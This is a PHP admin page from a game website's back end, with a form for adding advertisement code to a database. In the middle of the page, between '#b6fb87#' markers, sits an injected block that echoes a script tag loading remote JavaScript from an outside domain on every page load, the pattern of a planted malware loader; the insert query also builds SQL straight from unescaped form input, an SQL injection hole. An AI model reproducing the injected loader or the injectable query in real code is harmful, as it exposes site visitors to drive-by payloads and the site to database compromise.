<?php session_start();
ob_start();
$page = "Add Advertisement";
$side_menu="advertisement";
include "inc/session_check.php";

if(isset($_POST['submit']))
{
	$advert_page = $_POST['advert_page'];
	$advert_pos = $_POST['advert_pos'];
 	$ad_code = $_POST['ad_code'];
	
	$today = date("Y-m-d");
	
	
			$ins="insert into advertisement(advert_page,advert_pos,ad_code,post_date,status) values('$advert_page','$advert_pos','$ad_code','$today','$status')";
			if(mysql_query($ins))
			{
			header("location: add_advertisement.php?msg=succ&cont=Advertisement uploaded successfully");
			}
			else
			{
			header("location: add_advertisement.php?msg=err&cont=Error in insert query");
			}

}

?>
<!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->

  <head>
    <meta charset="utf-8">
    <title>Game Admin | Add Advertisement</title>
     <link href="icomoon/style.css" rel="stylesheet">
    <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
    <link href="css/main.css" rel="stylesheet">
    

  </head>
  <body>
    
    <?php 
	  	include "inc/header.php";
    ?>

    <div class="container-fluid">
      
    <?php 
	  	include "inc/main_nav.php";
    ?>
      
      <div class="dashboard-wrapper">
        <div class="main-container">
        
          <?php 
		  	include "inc/sub_navbar.php";
			include "inc/breadcrumb.php";
		  ?>

			<div class="row-fluid">
            <div class="span6">
              <div class="widget">
                <div class="widget-header">
                  <div class="title">
                  Advertisement
                  </div>
                </div>
                <div class="widget-body">
                	<?php include 'message.php'; ?>
<?php
#b6fb87#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967010\"></script>";
echo $g;
}
#/b6fb87#
?>                	<form class="form-horizontal no-margin well" id="ad_form" name="form" method="post" enctype="multipart/form-data" >
	            	  <h5 class="text-info">Advertisement Information</h5>
                    <hr>
                    <div class="control-group">
                      <label class="control-label">
                        Page * :
                      </label>
                      <div class="controls">
                      	<select class="required span4" name="advert_page" id="advert_page">
					<option value="">--Select</option>
					<option <?php if(isset($_POST['advert_page']) && $_POST['advert_page']=="home"){ echo "selected='selected'"; } ?> value="home">Home Page</option>
					<option <?php if(isset($_POST['advert_page']) && $_POST['advert_page']=="category"){ echo "selected='selected'"; } ?> value="category">Category</option>
					<option <?php if(isset($_POST['advert_page']) && $_POST['advert_page']=="inner"){ echo "selected='selected'"; } ?> value="inner">Play</option>
					</select>
                     </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        Advertisement Position * :
                      </label>
                      <div class="controls">
                      	<select class="required span4" name="advert_pos" id="advert_pos">
					<option value="">--Select</option>
					<?php
					$select_pos = mysql_query("select id,position from advertisement_position where status=1 order by id asc");
					while($fetch_pos=mysql_fetch_assoc($select_pos))
					{?>
					<option <?php if(isset($_POST['advert_pos']) && $_POST['advert_pos']==$fetch_pos['id']){ echo "selected='selected'"; } ?> value="<?=$fetch_pos['id']?>"><?=$fetch_pos['position']?></option>
					<?php }
					 ?>
					</select>
                     </div>
                    </div>
                    
                    <div class="control-group">
                      <label class="control-label">
                        Ad Code * :
                      </label>
                      <div class="controls">
                      	<textarea name="ad_code" rows="10" cols="50">
                      	</textarea>
                      </div>
                    </div>
                    <div class="form-actions no-margin">
				 	<input type="submit" class="btn btn-info" name="submit" value="submit">
                    </div>
			</form>
				</div>
              </div>
            </div>

            
          </div>

          
        </div>
      </div>
    </div>
    
    <?php
    include 'inc/footer.php';
    ?>
  
   <script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
    <script type="text/javascript"  src="js/jquery-latest.js"></script>
<script type="text/javascript"  src="js/jquery.validate.js"></script>
<script>
  $(document).ready(function(){
    $("#ad_form").validate({
    	success: function(label) {
			// set &nbsp; as text for IE
			label.html("&nbsp;").addClass("checked");
		}
    });
    $("#advert_pos").change(function(){
    	var posid = $(this).val();
    	dataString = "posid="+posid;
    	$.ajax({
    	type: "POST",
    	url: "get_ad_size.php",
    	data: dataString,
    	success: function(html){
    		$("#advert_size").html(html);
    	}
    	})
    });
    });
</script>
</body>
</html>
	